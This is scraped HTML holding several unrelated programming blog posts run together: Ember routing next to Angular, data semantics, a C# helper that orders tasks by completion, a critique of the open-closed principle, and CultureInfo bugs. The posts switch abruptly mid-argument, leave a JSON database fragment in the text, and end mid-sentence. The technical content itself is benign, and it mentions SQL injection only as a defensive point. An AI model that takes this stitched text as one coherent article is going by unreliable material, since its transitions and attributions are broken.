class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>I've been repeatedly told that\"Ember uses MVC in the classical Desktop way\" following Cocoa/Smalltalk style. OK I can buy that - but if that's the case<strong>why are controllers being tied to routes and models</strong>, conceptually? That might make sense for the web, but hardly for a desktop app.</p><p>Now I completely understand that we can throw theory at this<a href=\"http://st-www.cs.illinois.edu/users/smarch/st-docs/mvc.html\">and that Smalltalk-80 MVC</a>was instrumental in forming the concept behind Ember.</p><p>But even then - one model could be used in many controllers (and the reverse) depending on the need. I'm happy to shift my mind into Desktop mode - but it seems Ember still wants to retain some conceptual likeness to Rails, which I find most ... strange.</p><p>I remember watching<a href=\"http://blog.peepcode.com\">Geoffrey Grosenbach</a>explaining this in<a href=\"https://peepcode.com/products/emberjs\">Peepcode's very well done video tutorial on EmberJS</a>and feeling rather confused. I rewound the section and played it back, to see if I could understand what I was seeing.</p><p>And rewound it a few more times after that. It wasn't sinking in. I could not understand the difference between declaring a route, and configuring a RouteObject. Why not have the URL be a setting on the Ember.Route?</p><p>Now it could be that it was this way in the past - I've only gotten to know Ember 1.0 rc1 and I also know that the API changes rather dramatically from time to time.</p><p>But this is really confusing.</p><p>Here's how you do it in Angular:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//declare the app and any dependencies</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">App</span><span class=\"o\">=</span><span class=\"nx\">angular</span><span class=\"p\">.</span><span class=\"nx\">module</span><span class=\"p\">(</span><span class=\"s2\">\"App\"</span><span class=\"p\">,[]);</span></span><span class='line'></span><span class='line'><span class=\"c1\">//configure the app, injecting the Route Provider</span></span><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">config</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$routeProvider</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$routeProvider</span></span><span class='line'><span class=\"p\">.</span><span class=\"nx\">when</span><span class=\"p\">(</span><span class=\"s2\">\"/about\"</span><span class=\"p\">,</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">templateUrl</span><span class=\"o\">:</span><span class=\"s2\">\"about.html\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"s2\">\"App.AboutCtrl\"</span></span><span class='line'><span class=\"p\">})</span></span><span class='line'><span class=\"p\">.</span><span class=\"nx\">when</span><span class=\"p\">(</span><span class=\"s2\">\"/favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"o\">:</span><span class=\"s2\">\"App.FavoritesCtrl\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">templateUrl</span><span class=\"o\">:</span><span class=\"s2\">\"favorites.html\"</span></span><span class='line'><span class=\"p\">})</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Angular's approach is interesting and somewhat\"concept-y\" if you're not familiar with Dependency Injection. Once you get past that (or maybe you love it already) it becomes straightforward to understand that\"here's a route, use this template and this controller\".

It can quickly turn into a mess of configuration AND instrumentation - in other words doing a controller's job.</p><p>I think this is why the Ember team tried to separate the configuration of the routes from the route itself. But in doing so they marginalized the controller (which was their intent, if you read the controller's definition).</p><p>With Backbone I know what I'm getting into. I can use the Router as a controller (it used to be called that btw) and when things get a bit nuts, I can create a controller of my very own (<a href=\"http://marionettejs.com\">or just use MarionetteJS that has this concept built in</a>).</p><h2>Naming</h2><p>Ember relies heavily on naming conventions that must not only follow<a href=\"http://www.emberist.com/2012/04/09/naming-conventions.html\">syntax guidelines, but also casing guidelines</a>.</p><p>The reason for this is straightforward: Ember will generate code for you if you just need basic, boilerplated stuff, alleviating you from tedious coding which is rampant in other frameworks like Backbone.</p><p>The problem I have with this is that the relationship between things is in name only, and that seems like it's a rather brittle rule. It also tells me that I have to know the naming conventions<strong>as well as</strong>how to use the framework - which is fine, typically, as long as there's a big payoff.</p><p>And that's where I get stuck (again):<strong>what's the payoff, aside from implicit code generation, for following the naming conventions here?</strong>.

Follow that link to find the article in all its illustrated glory (along with many other fine articles, of course) – or read on for just the text.</p></blockquote><p>Back when I used to post on newsgroups I would frequently be in the middle of a debate of the details of some behaviour or terminology, when one poster would say: “You’re just quibbling over semantics” as if this excused any and all previous inaccuracies. I would usually agree –  I was indeed quibbling about semantics, but there’s no “just” about it.</p><p>Semantics is<em>meaning</em>, and that’s at the heart of communication – so for example, a debate over whether it’s correct to say that Java uses pass- by-reference<sup>1</sup>is all about semantics. Without semantics, there’s nothing to talk about.<br />This has been going on for years, and I’m quite used to being the pedant in any conversation when it comes to terminology – it’s a topic close to my heart. But over the years – and importantly since my attention has migrated to Stack Overflow, which tends to be more about real problems developers are facing than abstract discussions – I’ve noticed that I’m now being picky in the same sort of way, but about the meaning of data instead of terminology.</p><h2>Data under the microscope</h2><p>When it comes down to it, all the data we use is just bits – 1s and 0s. We assemble order from the chaos by ascribing meaning to those bits… and not just once, but in a whole hierarchy. For example, take the bits 01001010 00000000:</p><ul><li>Taken as a little-endian 16-bit unsigned integer, they form a value of 74. • That 16-bit unsigned integer can be viewed as a UTF-16 code unit for the character ‘J’.</li><li>That character might be the first character within a string.</li><li>That string might be the target of a reference, which is the value for a field called “firstName”.</li><li>That field might be within an instance of a class called “Person”.</li><li>The instance of “Person” whose “firstName” field has a value<br />which is a reference to the string whose first character is ‘J’ might itself be the target of a reference, which is the value for a field called “author”, within an instance of a class called “Article”.</li><li>The instance of “Article” whose “author” field (fill in the rest your- self…) might itself be the target of a reference which is part of a collection, stored (indirectly) via a field called “articles” in a class called “Magazine”.</li></ul><p>As we’ve zoomed out from sixteen individual bits, at every level we’ve imposed meaning. Imagine all the individual bits of information which would be involved in a single instance of the Magazine with a dozen articles, an editorial, credits – and perhaps even images. Really imagine them, all written down next to each other, possibly without even the helpful gap between bytes that I included in our example earlier.</p><p><br />That’s the raw data. Everything else is “just” semantics.</p><h2>So what does that have to do with me?</h2><p>I’m sure I haven’t told you anything you don’t already know. Yes, we can impose meaning on these puny bits, with our awesome developer power. The trouble is that bits have a habit of rebelling if you try to impose the wrong kind of meaning on them… and we seem to do that quite a lot.</p><p>The most common example I see on Stack Overflow is treating text (strings) and binary data (image files, zip files, encrypted data) as if they were interchangeable. If you try to load a JPEG using StreamReader in .NET or FileReader in Java, you’re going to have problems. There are ways you can actually get away with it – usually by using the ISO-8859-1 encoding – but it’s a little bit like trying to drive down a road with a broken steering wheel, only making progress by bouncing off other obstacles.</p><p>While this is a common example, it’s far from the only one. Some of the problems which fall into this category might not obviously be due to the mishandling of data, but at a deep level they’re all quite similar:</p><ul><li>SQL injection attacks due to mingling code (SQL) with data (values) instead of using parameters to keep the two separate.</li><li>The computer getting arithmetic “wrong” because the developer didn’t understand the meaning of floating binary point numbers, and should actually have used a floating decimal point type (such as System.Decimal or java.math. BigDecimal).</li><li>String formatting issues due to treating the result of a previous string formatting operation as another format string – despite the fact that now it includes user data which could really have any kind of text in it.</li><li>Double-encoding or double-unencoding of text data to make it safe for transport via a URL.</li><li>Almost anything to do with dates and times, including – but certainly not limited to – the way that java.util.Date and System. DateTime values don’t inherently have a format. They’re just values.</li></ul><p>The sheer bulk of questions which indicate a lack of understanding of the nature of data is enormous. Of course Stack Overflow only shows a tiny part of this – it doesn’t give much insight into the mountain of code which handles data correctly from the perspective of the types involved, but does entirely inappropriate things with those values from the perspective of the intended business meaning of those values.</p><p>It’s not all doom and gloom though. We have some simple but powerful weapons available in the fight against semantic drivel.</p><h3>Types</h3><p>This article gives a good indication of why I’m a fan of statically typed languages. The type system can convey huge amounts of information about the nature of data, even if the business meaning of values of those types can be horribly overloaded.</p><p><em>Maybe</em>it would be good if we distinguished between human-readable text which should usually be treated in a culture-sensitive way, and machine-parsable text which should usually be treated without reference to any culture. Those two types might have different operations available on them, for example – but it would almost certainly get messy very quickly.</p><p>For business-specific types though, it’s usually easy to make sure that each type is really only used for one concept, and only provides operations which are meaningful for that concept.</p><h3>Meaningful names</h3><p>Naming is undoubtedly hard, and I suspect most developers have had the same joyless experiences that I have of struggling for ten minutes to come up with a good class or method name, only to end up with the one we first thought of which we really don’t like… but which is simply better than all the other options we’ve considered. Still, it’s worth the struggle.</p><p>Our names don’t have to be perfect, but there’s simply no excuse for names such as “Form1” or “MyClass” which seem almost designed to carry no useful information whatsoever. Often simply the act of naming something can communicate meaning. Don’t be afraid to extract local variables in code just to clarify the meaning of some otherwise-obscure expression.</p><h3>Documentation</h3><p>I don’t think I’ve ever met a developer who actually enjoys writing documentation, but I think it’s hard to deny that it’s important. There tend to be very few things that are so precisely communicated just by the names of types, properties and methods that no further information is required. What is guaranteed about the data? How should it be used – and how should it not be used?</p><p>The form, style and detail level of documentation will vary from project to project, but don’t underestimate its value. Aside from behavioural  details, ask yourself what meaning you’re imposing on or assuming about the data you’re dealing with… what would happen if someone else made different assumptions? What could go wrong, and how can you prevent it by expressing your own understanding clearly? This isn’t just important for large projects with big teams, either – it’s entirely possible that the person who comes to the code with a different viewpoint is going to be you, six months later.</p><h2>Conclusion</h2><p>I apologise if this all sounds like motherhood and apple pie. I’m not saying anything new, after all – of course we all agree that we need to understand the meaning of the our data. I’m really not trying to waste your time though: I want you to take a moment to appreciate just how much it matters that we understand the data we work with, and how many problems can be avoided by putting effort into communicating that effectively and reading what others have written about their data.</p><p>There are other approaches we can take beyond those I’ve listed above, too – much more technically exciting ones – around static code analysis, contracts, complicated annotations and the like. I have nothing against them, but just understanding the value of semantics is a crucial starting point, and once everyone on your team agrees on that, you’ll be in a much better position to move forward and agree on the meaning of your data itself. From there, the world’s your oyster – if you see what I mean.</p><hr /><sup>1</sup>It doesn’t; references are passed by value, as even my non-programmer wife knows by now.

We don't really need to wait for<em>any</em>of the tasks to complete on each iteration of the loop - we only need to wait for the<em>next</em>task to complete. Now that sounds impossible - sure, it's great if we know the completion order of the tasks, but half the point of asynchrony is that many things can be happening at once, and we don't know when they'll complete. However, it's not as silly as it sounds.</p><p>If you give me a collection of tasks, I'll give you back another collection of tasks which will return the same results - but I'll order them so that the first returned task will have the same result as whichever of your original tasks completes first, and the second returned task will have the same result as whichever of your original tasks completes second, and so on. They won't be the<em>same</em>tasks as you gave me, reordered - but they'll be tasks with the same results. I'll propagate cancellation, exceptions and so on.</p><p>It still sounds impossible... until you realize that I don't have to associate one of my returned tasks with one of your original tasks<em>until it has completed</em>. Before anything has completed, all the tasks look the same. The trick is that as soon as I see one of your tasks complete, I can fetch the result and propagate it to the first of the tasks I've returned to you, using TaskCompletionSource&lt;T&gt;. When the second of your tasks completes, I propagate the result to the second of the returned tasks, etc. This is all quite easy using<a href=\"http://msdn.microsoft.com/en-us/library/dd235663.aspx\">Task&lt;T&gt;.ContinueWith</a>- barring a few caveats I'll mention later on.</p><p>Once we've built a method to do this, we can then<em>really easily</em>build a method which is the async equivalent of<a href=\"http://msdn.microsoft.com/en-us/library/system.threading.tasks.parallel.foreach.aspx\">Parallel.ForEach</a>(and indeed you could write multiple methods for the various overloads). This will execute a specific action on each task in turn, as it completes... it's<em>like</em>repeatedly calling<a href=\"http://msdn.microsoft.com/en-us/library/system.threading.tasks.task.whenany(v=vs.110).aspx\">Task.WhenAny</a>, but we only actually need to wait for one task at a time, because we know that the first task in our\"completion ordered\" collection will be the first one to complete (duh).</p><h3>Show me the code!</h3><p>Enough description - let's look at how we'll demonstrate both methods, and then how we implement them.</p><div class=\"code\"><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task PrintDelayedRandomTasksAsync()<br />{<br />    Random rng =<span class=\"Keyword\">new</span>Random();<br />   <span class=\"Linq\">var</span>values = Enumerable.Range(0, 10).Select(_ =&gt; rng.Next(3000)).ToList();<br />    Console.WriteLine(<span class=\"String\">\"Initial order: {0}\"</span>,<span class=\"ReferenceType\">string</span>.Join(<span class=\"String\">\"\"</span>, values));<br /><br />   <span class=\"Linq\">var</span>tasks = values.Select(DelayAsync);<br /><br />   <span class=\"Linq\">var</span>ordered = OrderByCompletion(tasks);<br /><br />    Console.WriteLine(<span class=\"String\">\"In order of completion:\"</span>);<br />   <span class=\"Modifier\">await</span>ForEach(ordered, Console.WriteLine);<br />}<br /><br /><span class=\"XmlComment\">///&lt;summary&gt;</span><br /><span class=\"XmlComment\">/// Returns a task which delays (asynchronously) by the given number of milliseconds,</span><br /><span class=\"XmlComment\">/// then return that same number back.</span><br /><span class=\"XmlComment\">///&lt;/summary&gt;</span><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">async</span>Task&lt;<span class=\"ValueType\">int</span>&gt; DelayAsync(<span class=\"ValueType\">int</span>delayMillis)<br />{<br />   <span class=\"Modifier\">await</span>TaskEx.Delay(delayMillis);<br />   <span class=\"Statement\">return</span>delayMillis;<br />}</div><p>The idea is that we're going to create 10 tasks which each just wait for some random period of time, and return the same time period back. We'll create them in any old order - but obviously they should complete in (at least roughly) the same order as the returned numbers.</p><p>Once we've created the collection of tasks, we'll call OrderByCompletion to create a<em>second</em>collection of tasks, returning the same results but this time in completion order - so ordered.ElementAt(0) will be the first task to complete, for example.</p><p>Finally, we call ForEach and pass in the ordered task collection, along with Console.WriteLine as the action to take with each value. We await the resulting Task to mimic blocking until the foreach loop has finished. Note that we<em>could</em>make this a non-async method and just return the task returned by ForEach, given that that's our only await expression and it's right at the end of the method. This would be marginally faster, too - there's no need to build an extra state machine. See<a href=\"http://msdn.microsoft.com/en-us/magazine/hh456402.aspx\">Stephen Toub's article about async performance</a>for more information.</p><h3>ForEach</h3><p>I'd like to get ForEach out of the way first, as it's so simple: it's literally just iterating over the tasks, awaiting them and propagating the result to the action. We get the\"return a task which will wait until we've finished\" for free by virtue of making it an async method.</p><div class=\"code\"><span class=\"XmlComment\">///&lt;summary&gt;</span><br /><span class=\"XmlComment\">/// Executes the given action on each of the tasks in turn, in the order of</span><br /><span class=\"XmlComment\">/// the sequence.

Let's get onto the meat...</p><h5>OrderByCompletion</h5><p>This is the tricky bit, and I've actually split it into two methods to make it slightly easier to comprehend. The PropagateResult method feels like it could be useful in other composition methods, too.</p><p>The basic plan is:</p><ul><li>Copy the input tasks to a list: we need to work out how many there are<em>and</em>iterate over them, so let's make sure we only iterate once</li><li>Create a collection of TaskCompletionSource&lt;T&gt; references, one for each input task.

The exception in PropagateResult really<em>shouldn't</em>happen - the continuation shouldn't be called when the task hasn't completed. I still need to think carefully about how tasks should propagate exceptions though.</p><p>The arguments to ContinueWith are more tricky: working through my TimeMachine class and some unit tests with Bill Wagner last week showed just how little I know about how SynchronizationContext, the task awaiters, task schedulers, and TaskContinuationOptions.ExecuteSynchronously all interact. I would<em>definitely</em>need to look into that more deeply before TimeMachine was really ready for heavy use... which means<em>you</em>should probably be looking at the TPL in more depth too.</p><h3>Conclusion</h3><p>Sure enough, when you run the code, the results appear in order, as the tasks complete. Here's one sample of the output:</p><div class=\"code\">Initial order: 335 468 1842 1991 2512 2603 270 2854 1972 1327<br />In order of completion:<br />270<br />335<br />468<br />1327<br />1842<br />1972<br />1991<br />2512<br />2603<br />2854</div><p>TODOs aside, the code in this post is remarkable (which I can say with modesty, as I've only refactored it from the code sent to me by another reader and Stephen Toub). It makes me smile every time I<em>think</em>about the seemingly-impossible job it accomplishes. I suspect this approach could be useful in any number of composition blocks - it's definitely one to remember.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1804970\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/t0SgYtV4iDA\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1280}}

Most of the principles seem pretty reasonable to me – but I've never\"got\" the open-closed principle (OCP from here on). At CodeMash this year, I mentioned this to the wonderful<a href=\"http://truncatedcodr.wordpress.com/\">Cori Drew</a>, who said that she'd been at a user group talk where she felt it was explained well. She mailed me a link to the<a href=\"http://usergroup.tv/videos/how-to-code-design-patterns\">user group video</a>, which I<em>finally</em>managed to get round to watching last week. (The OCP part is at around 1 hour 20.)</p><p>Unfortunately I still wasn't satisfied, so I thought I'd try to hit up the relevant literature. Obviously there are umpteen guides to OCP, but I decided to start with Wikipedia, and go from there. I mentioned my continuing disappointment on Twitter, and the conversation got lively. Uncle Bob Martin (one of the two\"canonical sources\" for OCP) wrote a follow-up blog post, and I decided it would be worth writing one of my own, too, which you're now reading.</p><p>I should say up-front that in some senses this blog post isn't so much about the details of the open-closed principle, as about the importance of careful choice of terminology at all levels. As we'll see later, when it comes to the\"true\" meaning of OCP, I'm pretty much with Uncle Bob: it's motherhood and apple pie. But I believe that meaning is much more clearly stated in various other principles, and that OCP as the expression of an idea is doing more harm than good.</p><h2>Reading material</h2><ul><li><a href=\"http://en.wikipedia.org/wiki/Open/closed_principle\">Wikipedia OCP entry</a></li><li><a href=\"http://www.objectmentor.com/resources/articles/ocp.pdf\">Uncle Bob Martin's 1996 paper</a></li><li><a href=\"http://codecourse.sourceforge.net/materials/The-Importance-of-Being-Closed.pdf\">Craig Larman's comparison with Protected Variation</a></li><li><a href=\"http://blog.8thlight.com/uncle-bob/2013/03/08/AnOpenAndClosedCase.html\">Uncle Bob's blog response</a></li></ul><h2>So what is it? (Part 1 – high level)</h2><p>This is where it gets interesting. You see, there appear to be several different interpretation of the principle – some only subtly distinct, others seemingly almost unrelated. Even without looking anything up, I knew an expanded version of the name:</p><blockquote><p>Modules should be open for extension and closed for modification.</p></blockquote><p>The version quoted in Wikipedia and in Uncle Bob's paper actually uses\"Software entities (classes, modules, functions, etc.)\" instead of modules, but I'm not sure that really helps. Now I'm not naïve enough to expect everything in a principle to be clear just from the title, but I do expect<em>some</em>light to be shed. In this case, unfortunately I'm none the wiser.\"Open\" and\"closed\" sound permissive and restrictive respectively, but without very concrete ideas about what\"extension\" and\"modification\" mean, it's hard to tell much more.</p><p>Fair enough – so we read on to the next level. Unfortunately I don't have Bertrand Meyer's\"Object-Oriented Software Construction\" book (which I take to be the original), but Uncle Bob's paper is freely available. Wikipedia's summary of Meyer's version is:</p><blockquote><p>The idea was that once completed, the implementation of a class could only be modified to correct errors; new or changed features would require that a different class be created. That class could reuse coding from the original class through inheritance. The derived subclass might or might not have the same interface as the original class.</p><p>Meyer's definition advocates implementation inheritance. Implementation can be reused through inheritance but interface specifications need not be. The existing implementation is closed to modifications, and new implementations need not implement the existing interface.</p></blockquote><p>And Uncle Bob's high level description is:</p><blockquote><p>Modules that conform to the open-closed principle have two primary attributes.</p><ol><li>They are\"Open For Extension\". This means that the behavior of the module can be extended. That we can make the module behave in new and different ways as the requirements of the application change, or to meet the needs of new applications.</li><li>They are\"Closed for Modiﬁcation\". The source code of such a module is inviolate. No one is allowed to make source code changes to it.</li></ol></blockquote><p>I immediately took a dislike to both of these descriptions. Both of them specifically say that the source code can't be changed, and the description of Meyer's approach to\"make a change by extending a class\" feels like a ghastly abuse of inheritance to me... and goes firmly against my (continued) belief in Josh Bloch's advice of\"design for inheritance or prohibit it\" – where in the majority of cases, designing a<em>class</em>for inheritance involves an awful lot of work for little gain. Designing an<em>interface</em>(or pure abstract class) still involves work, but with fewer restrictions and risks.</p><p>Craig Larman's article uses the term\"closed\" in a<em>much</em>more reasonable way, to my mind:</p><blockquote><p>Also, the phrase\"closed with respect to X\" means that clients are not affected if X changes.</p></blockquote><p>When I say\"more reasonable way\" I mean in terms of how I want to write code... not in terms of the use of the word\"closed\". This is simply not how the word\"closed\" is used elsewhere in my experience. In the rare cases where\"closed\"<em>is</em>used with\"to\", it's usually in terms of what's not allowed in:\"This bar is closed to under 18s\" for example. Indeed, that's how I read\"closed to modification\" and that appears to be backed up by the two quotes which say that once a class is complete, the source code cannot be changed.</p><p>Likewise the meaning of\"open for extension\" seems unusual to me. I'd argue that the intuitive meaning is\"can be extended\" – where the use of the term\"extended\" certainly nods towards inheritance, even if it's not intended meaning. If the idea is\"we can make the module behave differently\" – as Uncle Bob's description suggests – then\"open for extension\" is a very odd way of expressing that idea. I'd even argue that in the example given later, it's not the\"open\" module that behaves differently – it's the<em>combination</em>of the module and its collaborators, acting as a unified program, which behaves differently after some aspects are modified.</p><h2>So what is it? (Part 2 – more detail)</h2><p>Reading on through the rest of Uncle Bob's paper, the ideas become much more familiar. There's a reasonable example of a function which is asked to draw a collection of shapes: the bad code is aware of all the types of shape available, and handles each one separately. The good code uses an abstraction where each shape (Circle, Square) knows how to draw itself and inherits from a common base class (Shape). Great stuff... but what's that got to do with what was described above? How are the concepts of\"open\" and\"closed\" clarified?</p><p>The answer is that they're not. The word\"open\" doesn't occur anywhere in the rest of the text, other than as part of the term\"open-closed principle\" or as a label for\"open client\". While it's perhaps rather easier to see this in hindsight, I suspect that any time a section which is meant to clarify a concept doesn't use some of the key words used to describe the concept in a nutshell, that description should be treated as suspect.</p><p>The word\"closed\" appears more often, but<em>only</em>in terms of\"closed against\" which is never actually defined. (Is\"closed against\" the same as\"closed for\"?) Without Craig Larman's explanation, sentences like this make little sense to me:</p><blockquote><p>The function DrawAllShapes does not conform to the open-closed principle because it cannot be closed against new kinds of shapes.</p></blockquote><p>Even Craig's explanation feels somewhat at odds with Uncle Bob's usage, as it talks about<em>clients</em>being affected. This is another of the issues I have with the original two descriptions: they talk about a<em>single module</em>being open/closed, whereas we're dealing with abstractions where there are naturally at least two pieces of code involved (and usually three). Craig's description of changes in one module not affecting clients is describing a<em>relationship</em>– which is a far more useful way of approaching things. Even thinking about the shape example, I'm getting increasingly confused about exactly what's open and what's closed. It feels to me like it's neither the concrete shape classes nor the shape-drawing code which is open or closed – it's the interface between the two; the abstract Shape class. After all, these statements seem reasonable:</p><ul><li>The Shape class is open for extension: there can be many different concrete subclasses, and code which only depends on the Shape class doesn't need to know about them in order to use them when they are presented as shapes.</li><li>The Shape class is closed for modification: no existing functions can be removed (as they may be relied on by existing clients) and no new pure virtual functions can be added (as they will not be implemented by existing subclasses).</li></ul><p>It's still not how I'd choose to express it, but at least it feels like it makes sense in very concrete terms. It doesn't work well with how Uncle Bob uses the term\"closed\" though, so I still think I may be on a different page when it comes to that meaning. (Uncle Bob does also make the point that any significant program isn't going to adhere to the principle completely in every part of the code – but in order to judge where it's appropriate to be closed, I do really need to understand what being closed means.)</p><p>Just to make it crystal clear, other than the use of the word\"closed,\" the low-level description of what's good and what's bad, and why, is absolutely fine. I really have no problems with it. As I said at the start, the idea being expressed makes perfect sense. It just doesn't work (for me) when expressed in the terms used at a higher level.</p><h2>Protected Variation</h2><p>By contrast, let's look at a closely related idea which I hadn't actually heard about before I started all this research: protected variation. This name was apparently coined by Alistair Cockburn, and Craig Larman either quotes or paraphrases this as:</p><blockquote><p>Identify points of predicted variation and create a stable interface around them.</p></blockquote><p>Now that's a description I can immediately identify with. Every single word of it makes sense to me, even without reading any more of Craig's article. (I<em>have</em>read the rest, obviously, and I'd encourage others to do so.) This goes back to Josh Bloch's\"design for inheritance or prohibit it\" motto: identifying points of predicted variation is hard, and it's<em>necessary</em>in order to create a stable interface which is neither too constrictive for implementations nor too woolly for clients. With class inheritance there's the additional concern of interactions within a class hierarchy when a virtual method is called.</p><p>So in Uncle Bob's Shape example,<em>all</em>there is is a point of predicted variation: how the shape is drawn. PV suggests the converse as well – that as well as points of predicted variation, there may be points which will<em>not</em>vary. That's inherent in the API to some extent – every shape must be capable of drawing itself with no further information (the Draw method has no parameters) but it could also be extended to non-virtual aspects. For example, we could decide that every shape has one (and only one) colour, which will not change during its lifetime. That can be implemented in the Shape class itself – with no predicted variation, there's no need of polymorphism.</p><p>Of course, the costs of incorrectly predicting variation can be high: if you predict more variation than is actually warranted, you waste effort on over-engineering. If you predict<em>less</em>variation than is required, you usually end up<em>either</em>having to change quite a lot of code (if it's all under your control)<em>or</em>having to come up with an\"extended\" interface. There's the other aspect of shirking responsibility on this predicted variation to some extent, by making some parts\"optional\" – that's like saying,\"We know implementations will vary here in an incompatible way, but we're not going to try to deal with it in the API. Good luck!\" This usually arises in collection APIs, around mutating operations which may or may not be valid (based on whether the collection is mutable or not).</p><p>Not only is PV easy to understand – it's easy to remember for its comedy value, at least if you're a fan of<a href=\"http://en.wikipedia.org/wiki/The_Hitchhiker's_Guide_to_the_Galaxy\">The Hitchhiker's Guide to the Galaxy</a>. Remember Vroomfondel and Majikthise, the philosophers who invaded Cruxwan University just as Deep Thought was about to announce the answer to Life, the Universe, and Everything? Even though they were arguing with programmers, it sounds like they were actually the ones with software engineering experience:</p><blockquote><p>\"I'll tell you what the problem is mate,\" said Majikthise,\"demarcation, that's the problem!\"</p><p>[...]</p><p>\"That's right!\" shouted Vroomfondel,\"we demand rigidly defined areas of doubt and uncertainty!\"</p></blockquote><p>That sounds like a pretty good alternative description of Protected Variation to me.</p><h2>Conclusion</h2><p>So, that's what I don't like about OCP. The name, and the broad description – both of which I believe to be unhelpful, and poorly understood. (While I've obviously considered the possibility that I'm the only one who finds it confusing, I've heard enough variation in the explanations of it to suggest that I'm really<em>not</em>the only one.)</p><p>That sounds like a triviality, but I think it's rather important. I suspect that OCP has been at least mentioned in passing in thousands if not tends of thousands of user groups and conferences. The purpose of such gatherings is largely for communication of ideas – and when a sound idea is poorly expressed, an opportunity is wasted. I suspect that any time Uncle Bob has personally presented it in detail, the idea has sunk in appropriately – possibly after some initial confusion about the terminology. But what about all the misinterpretations and\"glancing blows\" where OCP is only mentioned as a good thing that clearly everyone wants to adhere to, with no explanation beyond the obscure ones described in part one above? How many times did they shed more confusion than light?</p><p>I believe more people are familiar with Uncle Bob's work on OCP than Bertrand Meyer's. Further, I suspect that if Bertrand Meyer hadn't already introduced the name and brief description, Uncle Bob may well have come up with far more descriptive ones himself, and the world would have been a better place. Fortunately, we do<em>have</em>a better name and description for a concept which is at least very closely related. (I'm not going to claim PV and OCP are identical, but close enough for a lot of uses.)</p><p>Ultimately, words matter – particularly when it comes to single sentence descriptions which act as soundbytes; shorthand for communicating a complex idea. It's not about whether the more complex idea can be understood after carefully reading thorough explanations. It's about whether the shorthand conveys the essence of the idea in a clear way.

For some reason, the<a href=\"http://teamcity.codebetter.com\">continuous integration host we're using</a>is<em>really</em>slow at loading resources under .NET 4. The unit tests which run in 10 seconds on my home laptop take over three<em>hours</em>on the continuous integration system. Taking stack traces at regular intervals showed the problem was with the NodaFormatInfo constructor, which reads some resources.</p><p>I may look into streamlining the resource access later, but before we get to that point, I wanted to try to reduce the number of times we call that constructor in the first place. NodaFormatInfo is meant to be cached, so I wouldn't have expected thousands of instances to be created - but it's only cached when the System.Globalization.CultureInfo it's based on is read-only. This is where the problems start...</p><p><a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.cultureinfo.aspx\">CultureInfo</a>is<em>conditionally mutable</em>(not an official term, just one I've coined for the purposes of this post). You can ask whether or not it's read-only with the<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.cultureinfo.isreadonly.aspx\">IsReadOnly property</a>, and obviously if it's read-only you can't change it. Additionally, CultureInfo is composed of other conditionally mutable objects -<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.datetimeformatinfo.aspx\">DateTimeFormatInfo</a>,<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.numberformatinfo.aspx\">NumberFormatInfo</a>etc. There's a static<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.cultureinfo.readonly.aspx\">ReadOnly method</a>on CultureInfo to create a read-only wrapper around a mutable CultureInfo. It's not clearly documented whether that's<em>expected</em>to take a deep copy (so that callers can really rely on it not changing) or whether it's expected to reflect any further changes made to the culture info it's based on. To go in the other direction, you can call Clone on a CultureInfo to create a mutable copy of any existing culture.</p><p>Further complications are introduced by the properties on the composite objects - we have properties such as<a href=\"http://msdn.microsoft.com/en-us/library/system.globalization.datetimeformatinfo.monthnames.aspx\">DateTimeFormatInfo.MonthNames</a>which returns a string array. Remember, arrays are<em>always</em>mutable. So it's really important to know whether the array reference returned from the property refers to a<em>copy</em>of the underlying data, or whether it refers to the array that's used internally by the type. Obviously for read-only DateTimeFormatInfo objects, I'd expect a copy to be returned - but for a mutable DateTimeFormatInfo, it would potentially make sense to return the underlying array reference. Unfortunately, the documentation doesn't make this clear - but in practice, it always returns a copy. If you need to change the month names, you need to clone the array, mutate the clone, and then set the MonthNames property.</p><p><em>All of this makes CultureInfo hard to work with</em>. The caching decision earlier on only really works if a\"read-only\" culture genuinely won't change behind the scenes. The type system gives you no help to catch subtle bugs at compile-time. Making any of this robust but efficient (in terms of taking minimal copies) is tricky to say the least.</p><p>Not only does it make it hard to work with from a client's point of view, but apparently it's hard to implement correctly too...</p><h2>First bug: Mono's invariant culture isn't terribly invariant...</h2><p>(Broken in 2.10.8; apparently fixed later.)</p><p>I discovered this while getting Noda Time's unit tests to pass on Mono. Unfortunately there are some I've had to effectively disable at the moment, due to deficiencies in Mono (some of which are being fixed, of course).</p><p>Here's a program which builds a clone of the invariant culture, changes the<em>clone's</em>genitive month names, and then prints out the first<em>non-genitive</em>name from the plain 